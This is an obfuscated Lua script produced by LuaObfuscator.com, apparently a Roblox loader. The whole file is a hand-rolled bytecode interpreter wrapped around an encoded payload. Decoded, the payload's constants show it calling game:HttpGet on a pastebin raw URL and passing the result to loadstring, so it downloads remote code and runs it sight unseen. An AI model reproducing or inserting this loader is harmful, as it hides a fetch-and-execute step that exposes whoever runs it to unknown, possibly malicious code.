--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v89=0;while true do if (v89==0) then v19=v0(v3(v30,1,1));return "";end end else local v90=v2(v0(v30,16));if v19 then local v113=0;local v114;while true do if (v113==1) then return v114;end if (v113==0) then v114=v5(v90,v19);v19=nil;v113=1;end end else return v90;end end end);local function v20(v31,v32,v33) if v33 then local v91=(v31/((5 -3)^(v32-(2 -1))))%(2^(((v33-(1 -0)) -(v32-1)) + 1 + 0)) ;return v91-(v91%(2 -(1 + 0))) ;else local v92=(621 -(555 + 64))^(v32-(932 -(857 + 74))) ;return (((v31%(v92 + v92))>=v92) and (569 -(367 + 201))) or (927 -(214 + 713)) ;end end local function v21() local v34=877 -((401 -119) + 595) ;local v35;while true do if (v34==1) then return v35;end if (v34==(1637 -(1523 + 114))) then v35=v1(v16,v18,v18);v18=v18 + 1 + 0 ;v34=1;end end end local function v22() local v36=1065 -(68 + 997) ;local v37;local v38;while true do if (v36==(1270 -(226 + 1044))) then v37,v38=v1(v16,v18,v18 + (8 -6) );v18=v18 + 2 ;v36=118 -((58 -26) + 85) ;end if (v36==1) then return (v38 * (610 -354)) + v37 ;end end end local function v23() local v39=0 -0 ;local v40;local v41;local v42;local v43;while true do if (v39==(351 -(87 + 263))) then return (v43 * (16777396 -(67 + 113))) + (v42 * ((87171 -39115) + 17480)) + (v41 * (628 -372)) + v40 ;end if ((0 + 0)==v39) then v40,v41,v42,v43=v1(v16,v18,v18 + (11 -8) );v18=v18 + (956 -(802 + 150)) ;v39=2 -(1 + 0) ;end end end local function v24() local v44=997 -(915 + (201 -119)) ;local v45;local v46;local v47;local v48;local v49;local v50;while true do if ((2 -1)==v44) then v47=1 + 0 ;v48=(v20(v46,1 -0 ,1207 -(1069 + 118) ) * ((4 -2)^(69 -37))) + v45 ;v44=1 + 0 + 1 ;end if (v44==((2 + 1) -1)) then v49=v20(v46,21 + 0 ,31);v50=((v20(v46,32)==(792 -(368 + 423))) and  -(3 -2)) or (19 -(10 + 8)) ;v44=11 -8 ;end if (v44==(442 -(416 + 26))) then v45=v23();v46=v23();v44=3 -2 ;end if (v44==(2 + 1)) then if (v49==(0 -0)) then if (v48==((258 + 180) -((1030 -(261 + 624)) + 293))) then return v50 * (430 -(44 + 386)) ;else v49=(2642 -1155) -(998 + 488) ;v47=0 + (0 -0) ;end elseif (v49==(1677 + (1313 -943))) then return ((v48==(1423 -(630 + 793))) and (v50 * (1/(772 -(201 + 571))))) or (v50 * NaN) ;end return v8(v50,v49-(2161 -(116 + (1881 -(814 + 45)))) ) * (v47 + (v48/((6 -4)^(216 -164)))) ;end end end local function v25(v51) local v52;if  not v51 then v51=v23();if (v51==(0 -0)) then return "";end end v52=v3(v16,v18,(v18 + v51) -(1 + 0) );v18=v18 + v51 ;local v53={};for v69=3 -2 , #v52 do v53[v69]=v2(v1(v3(v52,v69,v69)));end return v6(v53);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v54=(function() return function(v93,v94,v95,v96,v97,v98,v99,v100) local v93=(function() return 0;end)();local v94=(function() return;end)();local v96=(function() return;end)();while true do if (v93==0) then local v119=(function() return 0 -0 ;end)();local v120=(function() return;end)();while true do if (v119==(0 + 0)) then v120=(function() return 0;end)();while true do if (v120==1) then v93=(function() return  #"/";end)();break;end if (v120~=0) then else v94=(function() return v95();end)();v96=(function() return nil;end)();v120=(function() return 1 -0 ;end)();end end break;end end end if (v93== #"}") then if (v94== #",") then v96=(function() return v95()~=0 ;end)();elseif (v94==(5 -3)) then v96=(function() return v97();end)();elseif (v94~= #"gha") then else v96=(function() return v98();end)();end v99[v100]=(function() return v96;end)();break;end end return v93,v94,v95,v96,v97,v98,v99,v100;end;end)();local v55=(function() return function(v101,v102,v103) local v104=(function() return 0;end)();local v105=(function() return;end)();while true do if (v104==(1700 -(1419 + 281))) then v105=(function() return 0;end)();while true do if ((0 -0)~=v105) then else local v126=(function() return 0;end)();while true do if (v126==0) then v101[v102-#"|" ]=(function() return v103();end)();return v101,v102,v103;end end end end break;end end end;end)();local v56=(function() return {};end)();local v57=(function() return {};end)();local v58=(function() return {};end)();local v59=(function() return {v56,v57,nil,v58};end)();local v60=(function() return v23();end)();local v61=(function() return {};end)();for v71= #"|",v60 do FlatIdent_703C8,Type,v21,Cons,v24,v25,v61,v71=(function() return v54(FlatIdent_703C8,Type,v21,Cons,v24,v25,v61,v71);end)();end v59[ #"xxx"]=(function() return v21();end)();for v72= #"\\",v23() do local v73=(function() return v21();end)();if (v20(v73, #"|", #"]")==(74 -(71 + 3))) then local v108=(function() return 0;end)();local v109=(function() return;end)();local v110=(function() return;end)();local v111=(function() return;end)();local v112=(function() return;end)();while true do if (v108==1) then local v124=(function() return 0 + 0 ;end)();while true do if (v124~=1) then else v108=(function() return 2;end)();break;end if (v124==0) then v111=(function() return nil;end)();v112=(function() return nil;end)();v124=(function() return 1;end)();end end end if (v108==2) then while true do if (v109~= #"xnx") then else if (v20(v111, #"xxx", #"91(")== #"}") then v112[ #"http"]=(function() return v61[v112[ #"asd1"]];end)();end v56[v72]=(function() return v112;end)();break;end if (v109==(4 -2)) then local v128=(function() return 0;end)();local v129=(function() return;end)();while true do if (v128==0) then v129=(function() return 0 -0 ;end)();while true do if (v129~=(241 -(187 + 54))) then else if (v20(v111, #"<", #"|")== #" ") then v112[782 -(162 + 618) ]=(function() return v61[v112[2 + 0 ]];end)();end if (v20(v111,2 + 0 ,3 -1 )~= #"!") then else v112[ #"nil"]=(function() return v61[v112[ #"xnx"]];end)();end v129=(function() return 1;end)();end if ((1 -0)==v129) then v109=(function() return  #"nil";end)();break;end end break;end end end if (v109== #"]") then local v130=(function() return 0 + 0 ;end)();local v131=(function() return;end)();while true do if (v130~=(1636 -(1373 + 263))) then else v131=(function() return 1000 -(451 + 549) ;end)();while true do if (v131==0) then v112=(function() return {v22(),v22(),nil,nil};end)();if (v110==(0 + 0)) then local v139=(function() return 0 -0 ;end)();while true do if ((0 -0)==v139) then v112[ #"xxx"]=(function() return v22();end)();v112[ #"http"]=(function() return v22();end)();break;end end elseif (v110== #"}") then v112[ #"xnx"]=(function() return v23();end)();elseif (v110==2) then v112[ #"asd"]=(function() return v23() -((1386 -(746 + 638))^(7 + 9)) ;end)();elseif (v110== #"xxx") then local v332=(function() return 0 -0 ;end)();local v333=(function() return;end)();while true do if (v332~=(341 -(218 + 123))) then else v333=(function() return 0;end)();while true do if (v333==(1581 -(1535 + 46))) then v112[ #"nil"]=(function() return v23() -(2^16) ;end)();v112[ #"asd1"]=(function() return v22();end)();break;end end break;end end end v131=(function() return 1 + 0 ;end)();end if (v131==1) then v109=(function() return 1 + 1 ;end)();break;end end break;end end end if (v109~=(560 -(306 + 254))) then else local v132=(function() return 0 + 0 ;end)();while true do if ((1 -0)==v132) then v109=(function() return  #"~";end)();break;end if (v132==(1467 -(899 + 568))) then v110=(function() return v20(v73,2 + 0 , #"asd");end)();v111=(function() return v20(v73, #"0836",6);end)();v132=(function() return 2 -1 ;end)();end end end end break;end if (v108==(603 -(268 + 335))) then local v125=(function() return 290 -(60 + 230) ;end)();while true do if (v125~=0) then else v109=(function() return 572 -(426 + 146) ;end)();v110=(function() return nil;end)();v125=(function() return 1 + 0 ;end)();end if (v125~=1) then else v108=(function() return 1;end)();break;end end end end end end for v74= #"~",v23() do v57,v74,v28=(function() return v55(v57,v74,v28);end)();end return v59;end local function v29(v63,v64,v65) local v66=v63[1457 -(282 + 1174) ];local v67=v63[813 -(569 + 242) ];local v68=v63[8 -5 ];return function(...) local v75=v66;local v76=v67;local v77=v68;local v78=v27;local v79=1 + 0 ;local v80= -(1025 -(706 + 318));local v81={};local v82={...};local v83=v12("#",...) -(1272 -(945 + (1900 -(1281 + 293)))) ;local v84={};local v85={};for v106=(266 -(28 + 238)) -0 ,v83 do if (v106>=v77) then v81[v106-v77 ]=v82[v106 + 1 + 0 ];else v85[v106]=v82[v106 + (701 -((605 -334) + 429)) ];end end local v86=(v83-v77) + 1 + 0 ;local v87;local v88;while true do local v107=1500 -(1408 + 92) ;while true do if (v107==(1086 -((2020 -(1381 + 178)) + 625))) then v87=v75[v79];v88=v87[1289 -(993 + 295) ];v107=1 + 0 ;end if ((1172 -(418 + 753))==v107) then if (v88<=(12 + 18)) then if (v88<=(2 + 12)) then if (v88<=(2 + 4)) then if (v88<=(1 + 1)) then if ((v88<=(529 -(406 + 123))) or (377>2604)) then v85[v87[1771 -(1749 + 19 + 1) ]]=v85[v87[3]]%v85[v87[4]] ;elseif (v88>(1 + 0)) then do return;end else local v140=(1066 + 256) -(1249 + 73) ;local v141;local v142;local v143;while true do if ((568<911) and (v140==(1 + 0))) then v143=v85[v141] + v142 ;v85[v141]=v143;v140=1 + (3 -2) ;end if (v140==(1147 -(466 + 679))) then if (v142>0) then if (v143<=v85[v141 + (2 -1) ]) then v79=v87[8 -5 ];v85[v141 + (1903 -(106 + 930 + 864)) ]=v143;end elseif ((3285<4228) and (v143>=v85[v141 + 1 + 0 ])) then v79=v87[1 + 2 ];v85[v141 + (8 -5) ]=v143;end break;end if ((3916>3328) and (v140==(0 -0))) then v141=v87[116 -(4 + 110) ];v142=v85[v141 + (472 -(381 + 89)) ];v140=585 -(57 + 468 + 59) ;end end end elseif (v88<=(1431 -(41 + 1386))) then if ((2500<3839) and (v88>(106 -(12 + 5 + 86)))) then v85[v87[2 + 0 ]]=v87[(9 -3) -3 ] + v85[v87[(1167 -(1074 + 82)) -7 ]] ;else local v145=v87[168 -((266 -144) + 44) ];v85[v145]=v85[v145](v13(v85,v145 + (1 -0) ,v80));end elseif ((507==507) and (v88==(16 -(1795 -(214 + 1570))))) then v85[v87[2 + 0 ]]();else local v147=0 + 0 ;local v148;while true do if ((0 -0)==v147) then v148=v87[2];do return v13(v85,v148,v80);end break;end end end elseif (v88<=(75 -(30 + 35))) then if (v88<=(6 + (1457 -(990 + 465)))) then if (v88==(1264 -(1043 + 214))) then v85[v87[7 -5 ]]=v85[v87[3]]%v87[4] ;else v85[v87[1214 -(323 + 889) ]]= #v85[v87[7 -4 ]];end elseif ((240<=3165) and (v88>(589 -(361 + 219)))) then local v151=v87[322 -(53 + 111 + 156) ];local v152,v153=v78(v85[v151](v85[v151 + 1 + 0 ]));v80=(v153 + v151) -(414 -(15 + 398)) ;local v154=982 -(18 + 964) ;for v253=v151,v80 do v154=v154 + (3 -2) ;v85[v253]=v152[v154];end else v79=v87[3];end elseif (v88<=(7 + 3 + 2)) then if (v88>(7 + 4)) then local v156=v87[852 -(20 + 830) ];local v157,v158=v78(v85[v156](v13(v85,v156 + 1 + 0 ,v87[129 -(116 + 10) ])));v80=(v158 + v156) -(1 + 0 + 0) ;local v159=738 -(542 + 196) ;for v256=v156,v80 do v159=v159 + (1 -0) ;v85[v256]=v157[v159];end else v85[v87[2]]=v87[1 + 2 ];end elseif (v88>(7 + 6)) then local v162=v87[1 + 1 ];v85[v162](v85[v162 + 1 ]);else local v163=0 -0 ;local v164;while true do if ((834>=805) and (v163==(0 -0))) then v164=v87[2];v85[v164](v13(v85,v164 + (3 -2) ,v80));break;end end end elseif (v88<=22) then if (v88<=(1569 -(1126 + 425))) then if (v88<=(421 -((1844 -(1668 + 58)) + 287))) then if (v88>(58 -43)) then v85[v87[1123 -(118 + 1003) ]]={};else v85[v87[2]]=v64[v87[8 -5 ]];end elseif (v88>((1020 -(512 + 114)) -(142 + 235))) then local v168=v87[9 -7 ];v85[v168](v13(v85,v168 + 1 ,v80));else v85[v87[1 + 1 ]]=v85[v87[980 -(553 + 424) ]]%v85[v87[7 -3 ]] ;end elseif ((v88<=(18 + 2)) or (3812<2316)) then if (v88==(19 + (0 -0))) then local v170=v87[2 + 0 ];local v171=v85[v87[2 + (1 -0) ]];v85[v170 + (3 -2) + 0 ]=v171;v85[v170]=v171[v87[4]];else v85[v87[4 -2 ]]=v85[v87[7 -4 ]]%v87[(4 + 4) -4 ] ;end elseif (v88==(7 + 14)) then local v176=0;local v177;local v178;local v179;while true do if (((0 -0)==v176) or (2652<=1533)) then v177=v76[v87[756 -(239 + 97 + 417) ]];v178=nil;v176=1 + 0 + 0 ;end if (v176==1) then v179={};v178=v10({},{__index=function(v296,v297) local v298=1329 -(797 + 532) ;local v299;while true do if (0==v298) then v299=v179[v297];return v299[1 + 0 ][v299[1 + 1 ]];end end end,__newindex=function(v300,v301,v302) local v303=v179[v301];v303[1][v303[4 -2 ]]=v302;end});v176=1204 -(373 + 829) ;end if (v176==2) then for v305=1,v87[735 -((1605 -1129) + 255) ] do local v306=1130 -(369 + 761) ;local v307;while true do if ((v306==(1995 -(109 + 1885))) or (3598<1460)) then if ((v307[1 + 0 ]==(46 -20)) or (4116<1192)) then v179[v305-1 ]={v85,v307[3]};else v179[v305-1 ]={v64,v307[3 -0 ]};end v84[ #v84 + ((645 -308) -(144 + (1007 -(98 + 717)))) ]=v179;break;end if (v306==0) then v79=v79 + 1 ;v307=v75[v79];v306=217 -(42 + 174) ;end end end v85[v87[2 + 0 ]]=v29(v177,v178,v65);break;end end else v85[v87[2 + 0 ]][v87[2 + 1 ]]=v85[v87[1508 -((1189 -(802 + 24)) + 1141) ]];end elseif ((v88<=(1606 -(1183 + 397))) or (3377<=903)) then if (v88<=(72 -48)) then if (v88>(17 + 6)) then local v182=v87[2 + 0 ];do return v85[v182](v13(v85,v182 + (1976 -(1913 + (106 -44))) ,v87[(2 -0) + 1 ]));end elseif ((3976>=439) and  not v85[v87[5 -3 ]]) then v79=v79 + 1 ;else v79=v87[1936 -(565 + 1368) ];end elseif (v88>25) then v85[v87[7 -5 ]]=v85[v87[1 + 2 ]];else v85[v87[1663 -(1135 + 342 + 184) ]]=v64[v87[3 -0 ]];end elseif (v88<=28) then if (v88==(26 + 1)) then if (v85[v87[858 -(564 + 292) ]]==v87[6 -(1 + 1) ]) then v79=v79 + 1 ;else v79=v87[(2 + 6) -5 ];end else v85[v87[5 -3 ]]=v87[3] + v85[v87[308 -((813 -569) + 60) ]] ;end elseif ((3752==3752) and (v88>29)) then v85[v87[2 + 0 ]]=v65[v87[479 -(41 + 435) ]];else v85[v87[1003 -(336 + 602 + 63) ]]=v85[v87[3 + 0 ]] + v87[4] ;end elseif (v88<=(1170 -(936 + 189))) then if (v88<=(13 + 10 + 14)) then if ((4046>2695) and (v88<=(1646 -(1565 + 48)))) then if ((v88<=(20 + 11)) or (3545==3197)) then local v136=v87[1140 -(782 + 356) ];do return v13(v85,v136,v80);end elseif (v88==(299 -(176 + 91))) then v85[v87[(4 + 0) -2 ]][v87[4 -1 ]]=v85[v87[1096 -(975 + 117) ]];else local v193=v87[1877 -(157 + 1718) ];local v194=v85[v87[3 + 0 ]];v85[v193 + (3 -2) ]=v194;v85[v193]=v194[v87[13 -9 ]];end elseif (v88<=(1053 -(697 + 321))) then if (v88==(92 -(43 + 15))) then v85[v87[3 -1 ]]= #v85[v87[3]];else local v199=v87[4 -2 ];v85[v199]=v85[v199](v13(v85,v199 + 1 ,v80));end elseif (v88>(15 + 21)) then do return;end elseif  not v85[v87[3 -1 ]] then v79=v79 + (2 -1) ;else v79=v87[3];end elseif ((2394>373) and (v88<=(1268 -(151 + 171 + 905)))) then if (v88<=(650 -(602 + 9))) then if (v88==(1227 -(449 + 740))) then v85[v87[2]]=v85[v87[875 -(826 + 46) ]];else v85[v87[949 -(245 + 702) ]]={};end elseif (v88==(126 -86)) then local v204=0 + 0 ;local v205;while true do if (v204==(1898 -(260 + 1638))) then v205=v87[442 -(382 + 58) ];v85[v205]=v85[v205](v13(v85,v205 + (3 -(1435 -(797 + 636))) ,v87[3 + 0 ]));break;end end else v85[v87[(14 -11) -1 ]]=v85[v87[8 -5 ]][v87[1209 -(902 + 303) ]];end elseif (v88<=(93 -50)) then if (v88>(100 -58)) then local v208=0 + 0 ;local v209;local v210;local v211;while true do if (v208==(1690 -(1121 + 569))) then v209=v76[v87[217 -(22 + 192) ]];v210=nil;v208=684 -(483 + 200) ;end if ((4155<=4232) and (v208==((3083 -(1427 + 192)) -(1404 + 59)))) then v211={};v210=v10({},{__index=function(v308,v309) local v310=v211[v309];return v310[1][v310[5 -3 ]];end,__newindex=function(v311,v312,v313) local v314=0 -0 ;local v315;while true do if (v314==(765 -(468 + 297))) then v315=v211[v312];v315[563 -(334 + 228) ][v315[6 -4 ]]=v313;break;end end end});v208=2;end if (v208==(4 -(2 + 0))) then for v316=1,v87[6 -2 ] do v79=v79 + 1 + 0 ;local v317=v75[v79];if (v317[237 -(141 + 44 + 51) ]==(26 + 0)) then v211[v316-(2 -1) ]={v85,v317[8 -5 ]};else v211[v316-(1 + 0) ]={v64,v317[2 + 1 ]};end v84[ #v84 + (164 -(92 + (397 -(192 + 134)))) ]=v211;end v85[v87[1 + 1 ]]=v29(v209,v210,v65);break;end end else for v259=v87[2],v87[3] do v85[v259]=nil;end end elseif (v88>(73 -29)) then local v212=v87[2];do return v85[v212](v13(v85,v212 + (1277 -(316 + 960)) ,v87[768 -(574 + 191) ]));end else local v213=0 + 0 ;local v214;local v215;local v216;local v217;while true do if (v213==0) then v214=v87[4 -2 ];v215,v216=v78(v85[v214](v13(v85,v214 + 1 ,v87[2 + 1 ])));v213=850 -(254 + 595) ;end if ((v213==((72 + 56) -(55 + 71))) or (3581==3473)) then for v319=v214,v80 do v217=v217 + (1 -0) ;v85[v319]=v215[v217];end break;end if (v213==(1791 -(573 + 1217))) then v80=(v216 + v214) -1 ;v217=0;v213=2;end end end elseif (v88<=(146 -93)) then if (v88<=49) then if (v88<=(4 + 43)) then if (v88==(73 -27)) then v85[v87[2]]=v65[v87[3]];else local v220=0;local v221;while true do if (v220==(939 -(714 + 174 + 51))) then v221=v87[2 + 0 ];v85[v221]=v85[v221](v13(v85,v221 + 1 ,v87[8 -5 ]));break;end end end elseif ((4995>3348) and (v88==48)) then local v222=v87[2];local v223,v224=v78(v85[v222](v13(v85,v222 + (1 -(0 -0)) ,v80)));v80=(v224 + v222) -(1 + 0) ;local v225=0 -0 ;for v261=v222,v80 do v225=v225 + 1 ;v85[v261]=v223[v225];end else local v226=806 -(118 + 688) ;local v227;local v228;local v229;while true do if (v226==(48 -((576 -(83 + 468)) + 23))) then v227=v87[1 + 1 ];v228=v85[v227];v226=1887 -(927 + 959) ;end if ((v226==(3 -2)) or (754>3724)) then v229=v85[v227 + 2 ];if ((217>=57) and (v229>(732 -(16 + 716)))) then if ((v228>v85[v227 + (1807 -(1202 + 604)) ]) or (2070>=4037)) then v79=v87[5 -2 ];else v85[v227 + (100 -(11 + 86)) ]=v228;end elseif ((2705==2705) and (v228<v85[v227 + (2 -1) ])) then v79=v87[3];else v85[v227 + (288 -(175 + 110)) ]=v228;end break;end end end elseif (v88<=(128 -77)) then if (v88==((1148 -902) -196)) then local v230=v87[2];local v231=v85[v230 + (1798 -(503 + 1293)) ];local v232=v85[v230] + v231 ;v85[v230]=v232;if (v231>(0 -(0 -0))) then if (v232<=v85[v230 + (2 -1) ]) then local v322=0;while true do if ((61==61) and (v322==(0 + 0))) then v79=v87[3];v85[v230 + 3 ]=v232;break;end end end elseif (v232>=v85[v230 + (1062 -(810 + (576 -(45 + 280)))) ]) then local v323=0;while true do if ((v323==(0 + 0)) or (699>=1296)) then v79=v87[1 + 2 ];v85[v230 + 3 + 0 ]=v232;break;end end end else local v234=v87[(517 + 18) -(43 + 490) ];local v235,v236=v78(v85[v234](v85[v234 + (734 -(711 + 22)) ]));v80=(v236 + v234) -(3 -2) ;local v237=859 -(210 + 30 + 619) ;for v264=v234,v80 do local v265=0 + 0 + 0 ;while true do if (v265==(0 -0)) then v237=v237 + 1 + 0 + 0 ;v85[v264]=v235[v237];break;end end end end elseif ((v88==52) or (1783>=3616)) then v85[v87[1746 -(1344 + 400) ]]=v85[v87[408 -(255 + 150) ]] + v87[4 + 0 ] ;else v85[v87[2 + 0 + 0 ]]=v85[v87[12 -(16 -7) ]][v87[12 -8 ]];end elseif ((v88<=(1796 -(404 + 1335))) or (3913>4527)) then if (v88<=(461 -(183 + 223))) then if ((4376>817) and (v88>54)) then local v241=0 -0 ;local v242;while true do if (v241==(0 + 0)) then v242=v87[1 + 1 ];v85[v242](v85[v242 + (338 -(10 + 327)) ]);break;end end else v85[v87[2 + (1911 -(340 + 1571)) ]]();end elseif (v88>(394 -(118 + 220))) then if (v85[v87[1 + 1 ]]==v87[453 -(108 + 341) ]) then v79=v79 + 1 + 0 ;else v79=v87[(5 + 7) -9 ];end else for v266=v87[1495 -(711 + 782) ],v87[5 -2 ] do v85[v266]=nil;end end elseif (v88<=(528 -((2042 -(1733 + 39)) + 199))) then if ((4861>824) and (v88>((52 -33) + 39))) then local v243=v87[1821 -(580 + 1239) ];local v244=v85[v243];local v245=v85[v243 + (5 -3) ];if (v245>(0 + (1034 -(125 + 909)))) then if (v244>v85[v243 + (1949 -(1096 + 852)) + 0 ]) then v79=v87[3];else v85[v243 + 2 + 1 ]=v244;end elseif (v244<v85[v243 + 1 ]) then v79=v87[7 -4 ];else v85[v243 + 2 + 1 ]=v244;end else local v246=v87[1169 -(645 + 522) ];local v247,v248=v78(v85[v246](v13(v85,v246 + (1791 -(1010 + 780)) ,v80)));v80=(v248 + v246) -(1 + 0) ;local v249=0 -0 ;for v268=v246,v80 do local v269=0 -0 ;while true do if (v269==((824 + 1012) -(1045 + 791))) then v249=v249 + (2 -1) ;v85[v268]=v247[v249];break;end end end end elseif ((v88==60) or (1383>=2131)) then v79=v87[4 -1 ];else v85[v87[2]]=v87[3];end v79=v79 + (506 -(351 + 154)) ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!133Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274027Q004003123Q0014C826C6F32EC86AD1F363E62BCEB20BD82803053Q009C43AD4AA5028Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F71584E346345797203053Q007072696E7400324Q00107Q00122E000100013Q00202900010001000200122E000200013Q00202900020002000300122E000300013Q00202900030003000400122E000400053Q0006240004000B0001000100043C3Q000B000100122E000400063Q00202900050004000700122E000600083Q00202900060006000900122E000700083Q00202900070007000A00061500083Q000100062Q001A3Q00074Q001A3Q00014Q001A3Q00054Q001A3Q00024Q001A3Q00034Q001A3Q00064Q0026000900083Q00123D000A000C3Q00123D000B000D4Q002F0009000B00020010163Q000B000900123D0009000E4Q002A000A000A3Q00261B0009001E0001000E00043C3Q001E000100123D000A000E3Q00261B000A00210001000E00043C3Q0021000100122E000B000F3Q00122E000C00103Q002013000C000C001100123D000E00124Q000C000C000E4Q0003000B3Q00022Q0005000B0001000100122E000B00133Q002029000C3Q000B2Q000E000B0002000100043C3Q0031000100043C3Q0021000100043C3Q0031000100043C3Q001E00012Q00253Q00013Q00013Q00023Q00026Q00F03F026Q00704002264Q001000025Q00123D000300014Q002200045Q00123D000500013Q00043B0003002100012Q001900076Q0026000800024Q0019000900014Q0019000A00024Q0019000B00034Q0019000C00044Q0026000D6Q0026000E00063Q002034000F000600012Q000C000C000F4Q0003000B3Q00022Q0019000C00034Q0019000D00044Q0026000E00014Q0022000F00016Q000F0006000F001004000F0001000F2Q0022001000016Q0010000600100010040010000100100020340010001000012Q000C000D00104Q0030000C6Q0003000A3Q0002002014000A000A00022Q000A0009000A4Q000D00073Q00010004320003000500012Q0019000300054Q0026000400024Q0018000300044Q000600036Q00253Q00017Q00",v9(),...);
